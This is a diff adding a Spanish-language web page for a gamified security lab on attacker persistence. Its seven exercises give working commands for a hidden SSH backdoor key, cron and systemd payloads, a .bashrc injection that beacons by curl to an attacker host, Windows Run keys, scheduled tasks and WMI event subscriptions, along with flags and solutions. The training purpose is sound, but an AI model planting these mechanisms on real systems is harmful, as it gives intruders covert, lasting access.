@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔒 Lab persist-01: Técnicas de Persistencia — CyberDefense Labs</title>
+    <link rel="stylesheet" href="../../assets/css/lab-runner.css">
+</head>
+<body>
+    <div class="lab-page" id="lab-page"></div>
+    <script src="../../docs/assets/js/gamification.js"></script>
+    <script src="../../assets/js/lab-runner.js"></script>
+    <script>
+    const LAB_CONFIG = {
+        id: 'persist-01',
+        name: 'Técnicas de Persistencia',
+        subtitle: 'Mantén acceso tras reinicios con SSH keys, cron, systemd y más',
+        icon: '🔒',
+        difficulty: 'intermedio',
+        totalXP: 350,
+        time: '60 min',
+        exercises: [
+            {
+                title: 'SSH Key Persistence',
+                xp: 40,
+                objective: 'Instala una clave SSH persistente en el sistema.',
+                steps: ['Genera un par de claves ed25519', 'Agrega la clave pública a authorized_keys', 'Verifica que la clave funciona'],
+                code: '$ ssh-keygen -t ed25519 -f /home/lowuser/.ssh/.backdoor -N ""\n$ cat /home/lowuser/.ssh/.backdoor.pub >> /home/lowuser/.ssh/authorized_keys\n$ ssh -i /home/lowuser/.ssh/.backdoor lowuser@10.0.5.10',
+                codeLang: 'bash',
+                flag: 'FLAG{ssh_key_persist_ok}',
+                hint: 'La clave se almacena en ~/.ssh/ y authorized_keys es el archivo que autoriza claves.',
+                solution: 'Clave generada en ~/.ssh/.backdoor, pública agregada a authorized_keys. Acceso persistente logrado.'
+            },
+            {
+                title: 'Cron Job Persistence',
+                xp: 45,
+                objective: 'Crea un cron job que ejecute un payload cada 5 minutos.',
+                steps: ['Crea el script de persistencia', 'Agrega el cron job al usuario', 'Verifica que el cron está activo'],
+                code: '$ cat > /tmp/.backup.sh << \'SH\'\n#!/bin/bash\necho "[$(date)] Backup completado" >> /tmp/.backup.log\nSH\n$ chmod +x /tmp/.backup.sh\n$ (crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.backup.sh") | crontab -\n$ crontab -l',
+                codeLang: 'bash',
+                flag: 'FLAG{cron_5min_backup_created}',
+                hint: 'Los cron jobs se guardan con crontab -l. El formato es: min hour day month weekday command.',
+                solution: 'Cron job creado cada 5 minutos ejecutando /tmp/.backup.sh. Persiste tras reinicios de cron.'
+            },
+            {
+                title: 'Systemd Service Persistence',
+                xp: 45,
+                objective: 'Instala un servicio systemd que se ejecute al inicio del sistema.',
+                steps: ['Crea el archivo .service en /etc/systemd/system/', 'Crea el payload en /opt/', 'Habilita e inicia el servicio'],
+                code: '$ cat > /etc/systemd/system/sys-helper.service << \'EOF\'\n[Unit]\nDescription=System Helper\nAfter=network.target\n[Service]\nType=simple\nExecStart=/opt/.sys-helper\nRestart=always\n[Install]\nWantedBy=multi-user.target\nEOF\n$ systemctl daemon-reload\n$ systemctl enable --now sys-helper.service',
+                codeLang: 'bash',
+                flag: 'FLAG{systemd_service_enabled}',
+                hint: 'systemctl enable crea links simbólicos para que el servicio inicie con el sistema.',
+                solution: 'Servicio sys-helper habilitado. Se ejecuta automáticamente en cada boot del sistema.'
+            },
+            {
+                title: 'Bashrc Injection',
+                xp: 45,
+                objective: 'Inyecta código en .bashrc para persistir al login del usuario.',
+                steps: ['Agrega el payload al final de .bashrc', 'Crea el script de persistencia', 'Verifica que se ejecuta al hacer login'],
+                code: '$ echo \'nohup /opt/.hidden-service &>/dev/null &\' >> /home/lowuser/.bashrc\n$ cat > /opt/.hidden-service << \'SH\'\n#!/bin/bash\nwhile true; do\n    curl -s http://10.0.5.100:8080/beacon &>/dev/null\n    sleep 300\ndone\nSH\n$ chmod +x /opt/.hidden-service',
+                codeLang: 'bash',
+                flag: 'FLAG{bashrc_beacon_injected}',
+                hint: '.bashrc se ejecuta cada vez que el usuario abre un shell. nohup evita que se detenga al cerrar la terminal.',
+                solution: 'Payload inyectado en .bashrc. Se ejecuta cada vez que lowuser hace login, enviando beacons al atacante.'
+            },
+            {
+                title: 'Registry Run Keys',
+                xp: 45,
+                objective: 'Configura persistencia en Windows vía claves del Registro.',
+                steps: ['Agrega una Run key al HKCU', 'Verifica que la entrada existe', 'Documenta qué Other Run keys existen'],
+                code: 'C:\\> reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SystemHelper" /t REG_SZ /d "C:\\temp\\helper.exe" /f\nC:\\> reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"',
+                codeLang: 'powershell',
+                flag: 'FLAG{registry_run_key_added}',
+                hint: 'HKCU Run se ejecuta en cada login del usuario. RunOnce se ejecuta solo una vez.',
+                solution: 'Run key agregada. SystemHelper se ejecutará en cada login del usuario.'
+            },
+            {
+                title: 'Scheduled Tasks',
+                xp: 45,
+                objective: 'Crea una tarea programada en Windows que persista.',
+                steps: ['Crea una tarea con schtasks', 'Configura un trigger de inicio', 'Verifica la tarea creada'],
+                code: 'C:\\> schtasks /create /tn "SystemUpdate" /tr "C:\\temp\\update.exe" /sc daily /st 09:00 /f\nC:\\> schtasks /query /tn "SystemUpdate"',
+                codeLang: 'powershell',
+                flag: 'FLAG{scheduled_task_created}',
+                hint: 'schtasks /create crea tareas. /sc daily = ejecuta diariamente, /f = fuerza si ya existe.',
+                solution: 'Tarea SystemUpdate creada. Se ejecuta diariamente a las 09:00 ejecutando update.exe.'
+            },
+            {
+                title: 'WMI Event Subscription',
+                xp: 40,
+                objective: 'Implementa persistencia silenciosa usando WMI.',
+                steps: ['Crea un __EventFilter', 'Crea un CommandLineEventConsumer', 'Vincula filter y consumer'],
+                code: 'PS> $Filter = Set-WmiInstance -Namespace "root\\subscription" -Class __EventFilter -Arguments @{\n    Name="SystemFilter"; QueryLanguage="WQL"\n    Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_LocalTime\' AND TargetInstance.Second = 0"\n}\nPS> $Consumer = Set-WmiInstance -Namespace "root\\subscription" -Class CommandLineEventConsumer -Arguments @{\n    Name="SystemConsumer"; CommandLineTemplate="C:\\temp\\wmi-payload.exe"\n}\nPS> Set-WmiInstance -Namespace "root\\subscription" -Class __FilterToConsumerBinding -Arguments @{Filter=$Filter; Consumer=$Consumer}',
+                codeLang: 'powershell',
+                flag: 'FLAG{wmi_persistence_active}',
+                hint: 'WMI persiste en el WMI repository y se ejecuta cuando se dispara el evento (cada minuto en este caso).',
+                solution: 'WMI subscription creada. Se ejecuta wmi-payload.exe cada minuto cuando el segundo es 0.'
+            }
+        ]
+    };
+    document.addEventListener('DOMContentLoaded', () => { CDPN_LabRunner.init(LAB_CONFIG); });
+    </script>
+</body>
+</html>
